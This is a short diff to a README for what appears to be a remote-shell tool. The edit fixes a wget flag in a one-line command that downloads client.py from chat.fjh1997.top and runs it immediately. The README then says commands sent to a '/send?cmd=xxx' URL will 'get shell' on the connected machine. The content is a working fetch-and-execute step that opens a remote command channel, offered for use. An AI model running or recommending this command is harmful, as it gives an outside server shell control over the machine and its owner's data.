@@ -10,7 +10,7 @@ https://chat.fjh1997.top/
 
 Make client connect
 ```
-wget https://chat.fjh1997.top/download -o client.py && python3 client.py
+wget https://chat.fjh1997.top/download -O client.py && python3 client.py
 ```
 Then use https://chat.fjh1997.top/send?cmd=xxx to get shell!
 
